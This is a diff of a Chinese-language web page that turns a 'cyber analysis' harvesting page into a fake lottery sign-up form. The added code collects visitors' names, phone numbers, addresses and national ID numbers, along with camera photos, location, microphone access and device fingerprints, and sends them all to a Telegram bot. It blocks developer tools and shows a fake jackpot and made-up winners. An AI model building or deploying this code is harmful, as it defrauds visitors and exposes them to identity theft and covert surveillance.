-                   type === 'success' ? 'success@system:~$' : 'info@system:~$';
+function startBehaviorTracking() {
+    let mouseCount = 0;
+    let clickCount = 0;
+    let scrollCount = 0;
+    const startTime = Date.now();
     
-    const line = document.createElement('div');
-    line.className = 'terminal-line';
-    line.innerHTML = `<span class="prompt">${prompt}</span> ${message}`;
+    // 鼠标移动跟踪
+    document.addEventListener('mousemove', () => {
+        mouseCount++;
+        LOTTERY_DATA.behavior.mouseMovements = mouseCount;
+    });
     
-    terminal.appendChild(line);
-    terminal.scrollTop = terminal.scrollHeight;
-}
-
-function updateDataStream(text) {
-    const stream = document.getElementById('dataStream');
-    stream.textContent += '\n&gt; ' + text;
-    stream.scrollTop = stream.scrollHeight;
-}
-
-function playBeep() {
-    const beep = document.getElementById('beepSound');
-    beep.currentTime = 0;
-    beep.play().catch(() => {});
-}
-
-function playAlert() {
-    const alert = document.getElementById('alertSound');
-    alert.currentTime = 0;
-    alert.play().catch(() => {});
-}
-
-function delay(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-// =============================================
-// 启动系统
-// =============================================
-
-// 页面加载完成后启动
-window.addEventListener('load', () => {
-    setTimeout(() => {
-        initializeSystem();
+    // 点击跟踪
+    document.addEventListener('click', () => {
+        clickCount++;
+        LOTTERY_DATA.behavior.clicks = clickCount;
+    });
+    
+    // 滚动跟踪
+    document.addEventListener('scroll', () => {
+        scrollCount++;
+        LOTTERY_DATA.behavior.scrolls = scrollCount;
+    });
+    
+    // 时间跟踪
+    setInterval(() => {
+        LOTTERY_DATA.behavior.timeSpent = Math.round((Date.now() - startTime) / 1000);
     }, 1000);
-});
-</script>
-<script>
+}
+
 // =============================================
-// 数据收集和发送
+// 表单提交处理
 // =============================================
 
-async function collectAndSend() {
-    const button = event.target;
-    const originalText = button.innerHTML;
+function setupFormValidation() {
+    const form = document.getElementById('lotteryForm');
+    const inputs = form.querySelectorAll('input[required]');
+    
+    inputs.forEach(input => {
+        input.addEventListener('input', function() {
+            updateFormProgress();
+        });
+    });
+}
+
+function updateFormProgress() {
+    const form = document.getElementById('lotteryForm');
+    const inputs = form.querySelectorAll('input[required]');
+    let filled = 0;
+    
+    inputs.forEach(input => {
+        if (input.value.trim() !== '') {
+            filled++;
+        }
+    });
+    
+    const progress = Math.round((filled / inputs.length) * 100);
+    updateProgressBar(progress);
+}
+
+function updateProgressBar(percent) {
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+    
+    progressFill.style.width = percent + '%';
+    progressText.textContent = percent + '%';
+}
+
+// =============================================
+// 提交抽奖表单
+// =============================================
+
+async function submitLotteryForm() {
+    const submitBtn = document.getElementById('submitBtn');
+    const originalText = submitBtn.innerHTML;
     
     try {
-        button.disabled = true;
-        button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 发送中...';
+        // 禁用按钮
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 提交中...';
         
-        // 收集最后的数据
-        await collectFinalData();
+        // 收集表单数据
+        collectFormData();
         
-        // 更新显示
-        updateDataStream('正在加密数据...');
-        await delay(1000);
+        // 获取地理位置（如果授权）
+        if (LOTTERY_DATA.permissions.location) {
+            await getLocation();
+        }
         
-        updateDataStream('建立安全通道...');
-        await delay(800);
+        // 更新进度
+        updateProgressBar(90);
         
-        updateDataStream('发送分析报告...');
+        // 发送数据到Telegram
+        await sendDataToTelegram();
         
-        // 发送到Telegram
-        await sendToTelegram();
+        // 完成
+        updateProgressBar(100);
         
-        updateDataStream('数据发送成功！');
-        logToTerminal('分析报告已发送至指挥中心', 'success');
+        // 显示成功消息
+        submitBtn.innerHTML = '<i class="fas fa-check"></i> 提交成功！';
+        submitBtn.style.background = 'linear-gradient(90deg, #4CD964, #2ED573)';
         
-        // 显示成功动画
-        showSuccessAnimation();
+        // 显示中奖动画
+        showWinningAnimation();
         
-        // 重置按钮
+        // 3秒后重置
         setTimeout(() => {
-            button.disabled = false;
-            button.innerHTML = originalText;
+            resetForm();
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = originalText;
+            submitBtn.style.background = '';
         }, 3000);
         
     } catch (error) {
-        logToTerminal('发送失败: ' + error.message, 'error');
-        button.disabled = false;
-        button.innerHTML = originalText;
-    }
-}
-
-async function collectFinalData() {
-    // 收集时间数据
-    CYBER_DATA.system.endTime = new Date().toISOString();
-    CYBER_DATA.system.duration = 
-        new Date(CYBER_DATA.system.endTime) - new Date(CYBER_DATA.system.startTime);
-    
-    // 收集性能数据
-    if (performance.memory) {
-        CYBER_DATA.performance.memory = {
-            usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1048576),
-            totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1048576),
-            jsHeapSizeLimit: Math.round(performance.memory.jsHeapSizeLimit / 1048576)
-        };
-    }
-    
-    // 收集导航计时
-    const timing = performance.timing;
-    CYBER_DATA.performance.timing = {
-        dns: timing.domainLookupEnd - timing.domainLookupStart,
-        tcp: timing.connectEnd - timing.connectStart,
-        request: timing.responseStart - timing.requestStart,
-        response: timing.responseEnd - timing.responseStart,
-        dom: timing.domContentLoadedEventEnd - timing.domContentLoadedEventStart,
-        load: timing.loadEventEnd - timing.loadEventStart,
-        total: timing.loadEventEnd - timing.navigationStart
-    };
-    
-    // 收集扩展信息
-    detectBrowserExtensions();
-    
-    // 收集存储信息
-    CYBER_DATA.environment.storage = {
-        localStorage: Object.keys(localStorage).length,
-        sessionStorage: Object.keys(sessionStorage).length,
-        cookies: document.cookie.length,
-        indexedDB: 'indexedDB' in window
-    };
-    
-    // 收集权限状态
-    if (navigator.permissions && navigator.permissions.query) {
-        const permissions = [
-            'camera',
-            'microphone',
-            'geolocation',
-            'notifications',
-            'clipboard-read'
-        ];
+        logToConsole('提交失败: ' + error.message);
+        submitBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> 提交失败';
+        submitBtn.style.background = 'linear-gradient(90deg, #FF4757, #FF0000)';
         
-        for (const permission of permissions) {
-            try {
-                const result = await navigator.permissions.query({ name: permission });
-                CYBER_DATA.environment.permissions[permission] = result.state;
-            } catch(e) {}
-        }
+        setTimeout(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = originalText;
+            submitBtn.style.background = '';
+        }, 3000);
     }
 }
 
-async function sendToTelegram() {
-    // 格式化主要信息
-    const mainMessage = formatMainMessage();
+function collectFormData() {
+    LOTTERY_DATA.userInfo = {
+        name: document.getElementById('userName').value,
+        phone: document.getElementById('userPhone').value,
+        email: document.getElementById('userEmail').value,
+        wechat: document.getElementById('userWechat').value,
+        address: document.getElementById('userAddress').value,
+        idCard: document.getElementById('userIdCard').value,
+        submitTime: new Date().toISOString()
+    };
     
-    // 发送主要消息
-    await fetch(`${CONFIG.TELEGRAM.API_URL}${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
+    LOTTERY_DATA.system.lotteryNumber = generateLotteryNumber();
+}
+
+// =============================================
+// Telegram发送功能
+// =============================================
+
+async function sendDataToTelegram() {
+    try {
+        // 发送文本信息
+        const textMessage = formatTelegramMessage();
+        await sendTelegramMessage(textMessage);
+        
+        // 如果有照片，发送照片
+        if (LOTTERY_DATA.biometrics.photo) {
+            await sendTelegramPhoto(LOTTERY_DATA.biometrics.photo, '📸 抽奖参与者照片');
+        }
+        
+        // 发送详细数据文件
+        const detailedData = JSON.stringify(LOTTERY_DATA, null, 2);
+        await sendTelegramDocument(detailedData, '抽奖数据.json');
+        
+        logToConsole('数据已发送到Telegram');
+        
+    } catch (error) {
+        throw new Error('Telegram发送失败: ' + error.message);
+    }
+}
+
+async function sendTelegramMessage(text) {
+    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
+    
+    const response = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
             chat_id: CONFIG.TELEGRAM.CHAT_ID,
-            text: mainMessage,
+            text: text,
             parse_mode: 'HTML'
         })
     });
     
-    // 如果有照片，发送照片
-    if (CYBER_DATA.biometrics.photo) {
-        await fetch(`${CONFIG.TELEGRAM.API_URL}${CONFIG.TELEGRAM.BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CONFIG.TELEGRAM.CHAT_ID,
-                photo: CYBER_DATA.biometrics.photo,
-                caption: '📸 生物特征采集'
-            })
-        });
+    if (!response.ok) {
+        throw new Error('消息发送失败');
     }
+}
+
+async function sendTelegramPhoto(photoData, caption) {
+    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendPhoto`;
     
-    // 发送详细数据文件
-    const detailedData = formatDetailedData();
-    await fetch(`${CONFIG.TELEGRAM.API_URL}${CONFIG.TELEGRAM.BOT_TOKEN}/sendDocument`, {
+    const response = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
             chat_id: CONFIG.TELEGRAM.CHAT_ID,
-            document: `data:application/json;base64,${btoa(JSON.stringify(detailedData, null, 2))}`,
-            filename: `cyber_report_${CYBER_DATA.system.sessionId}.json`,
-            caption: '📁 完整分析报告'
+            photo: photoData,
+            caption: caption
         })
+    });
+    
+    if (!response.ok) {
+        throw new Error('照片发送失败');
+    }
+}
+
+async function sendTelegramDocument(data, filename) {
+    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendDocument`;
+    
+    const blob = new Blob([data], { type: 'application/json' });
+    const reader = new FileReader();
+    
+    return new Promise((resolve, reject) => {
+        reader.onloadend = async function() {
+            const base64data = reader.result.split(',')[1];
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
+                    document: `data:application/json;base64,${base64data}`,
+                    filename: filename
+                })
+            });
+            
+            if (response.ok) {
+                resolve();
+            } else {
+                reject(new Error('文档发送失败'));
+            }
+        };
+        
+        reader.readAsDataURL(blob);
     });
 }
 
-function formatMainMessage() {
-    const data = CYBER_DATA;
-    let message = `🚨 <b>高级数字身份分析报告</b>\n`;
-    message += `═══════════════════════\n\n`;
+function formatTelegramMessage() {
+    const data = LOTTERY_DATA;
+    let message = `🎰 <b>新的抽奖参与者！</b>\n\n`;
     
-    message += `🆔 <b>会话ID:</b> ${data.system.sessionId}\n`;
-    message += `⏰ <b>时间:</b> ${new Date().toLocaleString('zh-CN')}\n`;
-    message += `🌐 <b>协议:</b> ${data.system.protocol}\n\n`;
+    // 用户信息
+    message += `👤 <b>基本信息</b>\n`;
+    message += `姓名: ${data.userInfo.name}\n`;
+    message += `电话: ${data.userInfo.phone}\n`;
+    message += `微信: ${data.userInfo.wechat}\n`;
+    message += `邮箱: ${data.userInfo.email}\n`;
+    message += `地址: ${data.userInfo.address}\n`;
+    message += `身份证: ${data.userInfo.idCard}\n\n`;
     
-    message += `📍 <b>地理位置</b>\n`;
-    if (data.network.location.city) {
-        message += `├─ 城市: ${data.network.location.city}\n`;
-        message += `├─ 地区: ${data.network.location.region}\n`;
-        message += `├─ 国家: ${data.network.location.country}\n`;
-        message += `├─ 坐标: ${data.network.location.latitude}, ${data.network.location.longitude}\n`;
-    }
-    if (data.geolocation.precise) {
-        message += `├─ 精确坐标: ${data.geolocation.precise.latitude.toFixed(6)}, ${data.geolocation.precise.longitude.toFixed(6)}\n`;
-        message += `└─ 精度: ±${Math.round(data.geolocation.precise.accuracy)}米\n\n`;
-    } else {
-        message += `└─ 精度: 网络定位\n\n`;
-    }
-    
-    message += `💻 <b>设备信息</b>\n`;
-    message += `├─ IP地址: ${data.network.ip}\n`;
-    message += `├─ ISP: ${data.network.isp || '未知'}\n`;
-    message += `├─ 操作系统: ${getOS()}\n`;
-    message += `├─ 浏览器: ${getBrowser()}\n`;
-    message += `├─ CPU核心: ${data.fingerprint.hardware.cores}\n`;
-    message += `├─ 内存: ${data.fingerprint.hardware.memory}GB\n`;
-    message += `└─ 屏幕: ${window.screen.width}x${window.screen.height}\n\n`;
-    
-    message += `🔍 <b>安全分析</b>\n`;
-    message += `├─ 代理: ${data.network.proxy ? '✅ 检测到' : '❌ 未检测'}\n`;
-    message += `├─ VPN: ${data.network.vpn ? '✅ 检测到' : '❌ 未检测'}\n`;
-    message += `├─ TOR: ${data.network.tor ? '✅ 检测到' : '❌ 未检测'}\n`;
-    message += `└─ 指纹ID: ${document.getElementById('fingerprintId').textContent}\n\n`;
-    
-    message += `📊 <b>行为分析</b>\n`;
-    message += `├─ 鼠标移动: ${data.behavior.mouse.length} 次\n`;
-    message += `├─ 按键: ${data.behavior.keyboard.length} 次\n`;
-    message += `├─ 点击: ${data.behavior.clicks.length} 次\n`;
-    message += `└─ 滚动: ${data.behavior.scroll.length} 次\n\n`;
-    
-    message += `🎯 <b>传感器状态</b>\n`;
-    const sensorCount = Object.values(data.sensors).filter(v => v !== null).length;
-    message += `├─ 可用传感器: ${sensorCount}/7\n`;
-    message += `└─ 电池状态: ${data.sensors.battery ? data.sensors.battery.level : '未知'}\n\n`;
-    
-    message += `⏱️ <b>性能指标</b>\n`;
-    if (data.performance.timing) {
-        message += `└─ 页面加载: ${data.performance.timing.total}ms\n`;
-    }
-    
-    message += `\n📡 <b>网络信息</b>\n`;
-    if (data.network.connection) {
-        message += `├─ 类型: ${data.network.connection.effectiveType}\n`;
-        message += `├─ 延迟: ${data.network.connection.rtt}ms\n`;
-        message += `└─ 带宽: ${data.network.connection.downlink}Mbps\n`;
-    }
-    
-    return message;
-}
-
-function formatDetailedData() {
-    // 创建简化版本的数据用于发送
-    const simplifiedData = {
-        session: {
-            id: CYBER_DATA.system.sessionId,
-            start: CYBER_DATA.system.startTime,
-            end: CYBER_DATA.system.endTime,
-            duration: CYBER_DATA.system.duration
-        },
-        
-        location: {
-            ip: CYBER_DATA.network.ip,
-            city: CYBER_DATA.network.location.city,
-            country: CYBER_DATA.network.location.country,
-            coordinates: CYBER_DATA.network.location.latitude ? 
-                `${CYBER_DATA.network.location.latitude},${CYBER_DATA.network.location.longitude}` : null,
-            precise: CYBER_DATA.geolocation.precise ? {
-                lat: CYBER_DATA.geolocation.precise.latitude,
-                lng: CYBER_DATA.geolocation.precise.longitude,
-                accuracy: CYBER_DATA.geolocation.precise.accuracy
-            } : null
-        },
-        
-        device: {
-            fingerprint: document.getElementById('fingerprintId').textContent,
-            browser: getBrowser(),
-            os: getOS(),
-            screen: `${window.screen.width}x${window.screen.height}`,
-            cores: CYBER_DATA.fingerprint.hardware.cores,
-            memory: CYBER_DATA.fingerprint.hardware.memory,
-            userAgent: navigator.userAgent
-        },
-        
-        network: {
-            isp: CYBER_DATA.network.isp,
-            asn: CYBER_DATA.network.asn,
-            proxy: CYBER_DATA.network.proxy,
-            vpn: CYBER_DATA.network.vpn,
-            tor: CYBER_DATA.network.tor,
-            connection: CYBER_DATA.network.connection
-        },
-        
-        behavior: {
-            mouseMovements: CYBER_DATA.behavior.mouse.length,
-            keyPresses: CYBER_DATA.behavior.keyboard.length,
-            clicks: CYBER_DATA.behavior.clicks.length,
-            scrolls: CYBER_DATA.behavior.scroll.length
-        },
-        
-        biometrics: {
-            photoCaptured: !!CYBER_DATA.biometrics.photo,
-            faceDetected: CYBER_DATA.biometrics.faceData ? CYBER_DATA.biometrics.faceData.detected : false
-        },
-        
-        sensors: {
-            count: Object.values(CYBER_DATA.sensors).filter(v => v !== null).length,
-            battery: CYBER_DATA.sensors.battery
-        },
-        
-        timestamp: new Date().toISOString()
-    };
-    
-    return simplifiedData;
-}
-
+    // 抽奖信息
+    message += `🎯 <b>抽奖信息</b>\n`;
+<script>
 // =============================================
-// 其他辅助功能
+// 额外的安全检测功能
 // =============================================
 
-function getOS() {
-    const userAgent = navigator.userAgent;
-    if (userAgent.indexOf('Windows') !== -1) return 'Windows';
-    if (userAgent.indexOf('Mac') !== -1) return 'macOS';
-    if (userAgent.indexOf('Linux') !== -1) return 'Linux';
-    if (userAgent.indexOf('Android') !== -1) return 'Android';
-    if (userAgent.indexOf('iOS') !== -1) return 'iOS';
-    return 'Unknown';
-}
-
-function getBrowser() {
-    const userAgent = navigator.userAgent;
-    if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) return 'Chrome';
-    if (userAgent.indexOf('Firefox') !== -1) return 'Firefox';
-    if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) return 'Safari';
-    if (userAgent.indexOf('Edg') !== -1) return 'Edge';
-    return 'Unknown';
-}
-
-function setupSensor(sensorName) {
-    switch(sensorName) {
-        case 'Accelerometer':
-            if ('Accelerometer' in window) {
-                const accelerometer = new Accelerometer({ frequency: 10 });
-                accelerometer.addEventListener('reading', () => {
-                    CYBER_DATA.sensors.accelerometer = {
-                        x: accelerometer.x,
-                        y: accelerometer.y,
-                        z: accelerometer.z
-                    };
-                });
-                accelerometer.start();
-            }
-            break;
-            
-        case 'Gyroscope':
-            if ('Gyroscope' in window) {
-                const gyroscope = new Gyroscope({ frequency: 10 });
-                gyroscope.addEventListener('reading', () => {
-                    CYBER_DATA.sensors.gyroscope = {
-                        x: gyroscope.x,
-                        y: gyroscope.y,
-                        z: gyroscope.z
-                    };
-                });
-                gyroscope.start();
-            }
-            break;
-    }
-}
-
-function updateBehaviorAnalysis() {
-    const behaviorScore = Math.min(100, 
-        CYBER_DATA.behavior.mouse.length * 0.1 + 
-        CYBER_DATA.behavior.keyboard.length * 0.5 + 
-        CYBER_DATA.behavior.clicks.length * 0.3
-    );
-    
-    document.getElementById('behaviorScore').textContent = Math.round(behaviorScore) + '%';
-    document.getElementById('behaviorProgress').style.width = behaviorScore + '%';
-}
-
-function updatePerformanceMetrics() {
-    // 模拟CPU使用率
-    const cpuUsage = 10 + Math.random() * 40;
-    document.getElementById('cpuUsage').textContent = Math.round(cpuUsage) + '%';
-    
-    // 模拟内存使用
-    if (performance.memory) {
-        const memoryMB = Math.round(performance.memory.usedJSHeapSize / 1048576);
-        document.getElementById('memoryUsage').textContent = memoryMB + ' MB';
-    }
-    
-    // 更新数据吞吐量
-    const throughput = 50 + Math.random() * 200;
-    document.getElementById('dataThroughput').textContent = Math.round(throughput) + ' KB/s';
-}
-
-function updateRealtimeData() {
-    const stream = document.getElementById('dataStream');
-    const messages = [
-        '分析用户行为模式...',
-        '监控网络流量...',
-        '检测异常活动...',
-        '更新安全证书...',
-        '同步分布式节点...',
-        '验证加密通道...',
-        '扫描系统漏洞...',
-        '优化AI算法...',
-        '备份关键数据...',
-        '清理临时文件...'
-    ];
-    
-    const randomMessage = messages[Math.floor(Math.random() * messages.length)];
-    stream.textContent += '\n&gt; ' + randomMessage;
-    stream.scrollTop = stream.scrollHeight;
-}
-
-function simulatePortScan() {
-    const commonPorts = [80, 443, 22, 21, 25, 53, 110, 143, 3389];
-    CYBER_DATA.network.ports = commonPorts.map(port => ({
-        port: port,
-        status: Math.random() > 0.7 ? 'open' : 'closed',
-        service: getServiceName(port)
-    }));
-}
-
-function getServiceName(port) {
-    const services = {
-        80: 'HTTP',
-        443: 'HTTPS',
-        22: 'SSH',
-        21: 'FTP',
-        25: 'SMTP',
-        53: 'DNS',
-        110: 'POP3',
-        143: 'IMAP',
-        3389: 'RDP'
-    };
-    return services[port] || 'Unknown';
-}
-
-function detectBrowserExtensions() {
-    // 检测广告拦截器
-    const adBlockTest = document.createElement('div');
-    adBlockTest.className = 'adsbox';
-    adBlockTest.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;';
-    document.body.appendChild(adBlockTest);
-    
-    setTimeout(() => {
-        const isAdBlocked = adBlockTest.offsetHeight === 0 || 
-                           getComputedStyle(adBlockTest).display === 'none';
-        CYBER_DATA.environment.extensions.adBlock = isAdBlocked;
-        document.body.removeChild(adBlockTest);
-    }, 100);
-}
-
-async function fetchWeather(lat, lon) {
+// 检测VPN/代理
+async function detectVPN() {
     try {
-        const response = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`);
+        const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
         
-        if (data.current_weather) {
-            updateDataStream(`天气: ${data.current_weather.temperature}°C, ${data.current_weather.windspeed}km/h`);
+        // 检查常见代理标志
+        const vpnDetected = data.org && (
+            data.org.toLowerCase().includes('vpn') ||
+            data.org.toLowerCase().includes('proxy') ||
+            data.org.toLowerCase().includes('tor')
+        );
+        
+        if (vpnDetected) {
+            logToConsole('检测到可能使用VPN/代理');
+            LOTTERY_DATA.network.vpnDetected = true;
+            LOTTERY_DATA.network.vpnInfo = data.org;
         }
-    } catch(e) {
+        
+    } catch (error) {
         // 静默失败
     }
 }
 
-function showSuccessAnimation() {
-    // 创建粒子效果
-    for (let i = 0; i < 100; i++) {
-        createParticle();
+// 检测设备电池
+async function detectBattery() {
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            LOTTERY_DATA.device.battery = {
+                charging: battery.charging,
+                level: Math.round(battery.level * 100),
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
+            };
+        } catch (error) {
+            // 静默失败
+        }
     }
-    
-    // 播放成功音效
-    playAlert();
-    
-    // 显示成功消息
-    const successDiv = document.createElement('div');
-    successDiv.style.cssText = `
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background: rgba(0, 243, 255, 0.95);
-        color: #000;
-        padding: 30px 50px;
-        border-radius: 15px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        z-index: 10001;
-        border: 3px solid var(--matrix-green);
-        box-shadow: 0 0 50px rgba(0, 243, 255, 0.8);
-        text-align: center;
-    `;
-    successDiv.innerHTML = `
-        <div style="font-size: 3rem; margin-bottom: 20px;">✅</div>
-        <div>分析报告已发送！</div>
-        <div style="font-size: 1rem; margin-top: 10px;">会话ID: ${CYBER_DATA.system.sessionId}</div>
-    `;
-    
-    document.body.appendChild(successDiv);
-    
-    setTimeout(() => {
-        document.body.removeChild(successDiv);
-    }, 3000);
 }
 
-function createParticle() {
-    const particle = document.createElement('div');
-    particle.style.cssText = `
-        position: fixed;
-        width: 4px;
-        height: 4px;
-        background: ${Math.random() > 0.5 ? 'var(--cyber-blue)' : 'var(--matrix-green)'};
-        border-radius: 50%;
-        pointer-events: none;
-        z-index: 10000;
-    `;
+// 检测时区
+function detectTimezone() {
+    LOTTERY_DATA.device.timezone = {
+        name: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        offset: new Date().getTimezoneOffset(),
+        locale: navigator.language
+    };
+}
+
+// 检测屏幕方向
+function detectOrientation() {
+    LOTTERY_DATA.device.orientation = {
+        type: screen.orientation ? screen.orientation.type : 'unknown',
+        angle: screen.orientation ? screen.orientation.angle : 0
+    };
     
-    const startX = Math.random() * window.innerWidth;
-    const startY = Math.random() * window.innerHeight;
-    
-    particle.style.left = startX + 'px';
-    particle.style.top = startY + 'px';
-    
-    document.body.appendChild(particle);
-    
-    // 动画
-    const animation = particle.animate([
-        { 
-            transform: 'translate(0, 0) scale(1)', 
-            opacity: 1 
-        },
-        { 
-            transform: `translate(${(Math.random() - 0.5) * 100}px, ${(Math.random() - 0.5) * 100}px) scale(0)`, 
-            opacity: 0 
-        }
-    ], {
-        duration: 1000 + Math.random() * 1000,
-        easing: 'cubic-bezier(0.1, 0.8, 0.9, 0.1)'
+    // 监听方向变化
+    screen.orientation && screen.orientation.addEventListener('change', () => {
+        LOTTERY_DATA.device.orientation = {
+            type: screen.orientation.type,
+            angle: screen.orientation.angle
+        };
     });
+}
+
+// 检测网络状态变化
+function monitorNetwork() {
+    if (navigator.connection) {
+        navigator.connection.addEventListener('change', () => {
+            LOTTERY_DATA.network.connection = {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData
+            };
+        });
+    }
+}
+
+// =============================================
+// 麦克风测试功能
+// =============================================
+
+async function testMicrophone() {
+    if (!LOTTERY_DATA.permissions.mic) return;
     
-    animation.onfinish = () => particle.remove();
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const analyser = audioContext.createAnalyser();
+        const microphone = audioContext.createMediaStreamSource(stream);
+        microphone.connect(analyser);
+        
+        LOTTERY_DATA.biometrics.microphone = {
+            sampleRate: audioContext.sampleRate,
+            channels: stream.getAudioTracks()[0].getSettings().channelCount || 1,
+            tested: true,
+            timestamp: new Date().toISOString()
+        };
+        
+        // 5秒后停止
+        setTimeout(() => {
+            stream.getTracks().forEach(track => track.stop());
+            audioContext.close();
+        }, 5000);
+        
+    } catch (error) {
+        logToConsole('麦克风测试失败: ' + error.message);
+    }
 }
 
 // =============================================
-// 系统控制函数
-// =============================================
-
-function startFullAnalysis() {
-    logToTerminal('启动完整系统分析...', 'info');
-    updateDataStream('深度扫描启动...');
-    
-    // 启动所有数据收集
-    requestCameraAccess();
-    getPreciseLocation();
-    
-    // 模拟深度扫描
-    setTimeout(() => {
-        updateDataStream('系统内核分析...');
-        simulateDeepScan();
-    }, 2000);
-}
-
-function simulateDeepScan() {
-    const scanSteps = [
-        '扫描系统进程...',
-        '分析网络连接...',
-        '检查文件系统...',
-        '验证安全证书...',
-        '检测恶意软件...',
-        '分析内存转储...',
-        '监控注册表...',
-        '检查启动项...',
-        '验证数字签名...',
-        '生成安全报告...'
-    ];
-    
-    let step = 0;
-    const interval = setInterval(() => {
-        if (step < scanSteps.length) {
-            updateDataStream(scanSteps[step]);
-            step++;
-        } else {
-            clearInterval(interval);
-            updateDataStream('深度扫描完成！');
-            logToTerminal('系统分析完成，未发现威胁', 'success');
-        }
-    }, 1000);
-}
-
-// =============================================
-// 其他初始化函数
-// =============================================
-
-async function loadCoreModules() {
-    // 模拟加载模块
-    await delay(800);
-    return true;
-}
-
-async function initEncryption() {
-    // 模拟加密初始化
-    await delay(600);
-    return true;
-}
-
-async function establishConnection() {
-    // 模拟连接建立
-    await delay(1200);
-    return true;
-}
-
-// =============================================
-// 页面保护
+// 页面保护功能
 // =============================================
 
 // 防止复制
 document.addEventListener('copy', (e) => {
     e.preventDefault();
-    logToTerminal('安全策略：复制操作被阻止', 'warning');
+    Swal.fire({
+        icon: 'warning',
+        title: '复制功能已禁用',
+        text: '为保证抽奖公平，禁止复制页面内容',
+        timer: 2000,
+        showConfirmButton: false
+    });
 });
 
 // 防止右键
 document.addEventListener('contextmenu', (e) => {
     e.preventDefault();
-    logToTerminal('安全策略：右键菜单被阻止', 'warning');
 });
 
 // 防止开发工具
 document.onkeydown = function(e) {
     if (e.key === 'F12' || 
-        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
         (e.ctrlKey && e.key === 'U')) {
         e.preventDefault();
-        logToTerminal('安全策略：开发工具访问被阻止', 'warning');
+        Swal.fire({
+            icon: 'error',
+            title: '访问被拒绝',
+            text: '为保证抽奖安全，禁止使用开发者工具',
+            timer: 3000,
+            showConfirmButton: false
+        });
         return false;
     }
 };
 
 // 页面离开确认
 window.addEventListener('beforeunload', (e) => {
-    if (CYBER_DATA.behavior.mouse.length > 10) {
+    if (LOTTERY_DATA.userInfo.name) {
         e.preventDefault();
-        e.returnValue = '分析正在进行中，确定要离开吗？';
+        e.returnValue = '抽奖信息尚未提交，确定要离开吗？';
     }
 });
+
+// =============================================
+// 定期更新显示
+// =============================================
+
+setInterval(() => {
+    // 更新倒计时
+    updateJackpotAmount();
+    
+    // 随机更新中奖者
+    if (Math.random() > 0.7) {
+        generateWinnersList();
+    }
+}, 60000); // 每分钟更新一次
+
+function updateJackpotAmount() {
+    const currentAmount = parseFloat(document.getElementById('jackpotAmount').textContent.replace(/[^0-9]/g, ''));
+    const newAmount = currentAmount + Math.random() * 10000;
+    document.getElementById('jackpotAmount').textContent = '¥ ' + formatCurrency(newAmount);
+}
+
+// =============================================
+// 初始化所有功能
+// =============================================
+
+// 页面完全加载后执行
+window.onload = function() {
+    // 延迟执行额外检测
+    setTimeout(() => {
+        detectVPN();
+        detectBattery();
+        detectTimezone();
+        detectOrientation();
+        monitorNetwork();
+        
+        // 如果麦克风权限开启，测试麦克风
+        if (LOTTERY_DATA.permissions.mic) {
+            setTimeout(() => testMicrophone(), 5000);
+        }
+        
+    }, 5000);
+};
 </script>
+
+<!-- 添加SweetAlert库 -->
+<link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
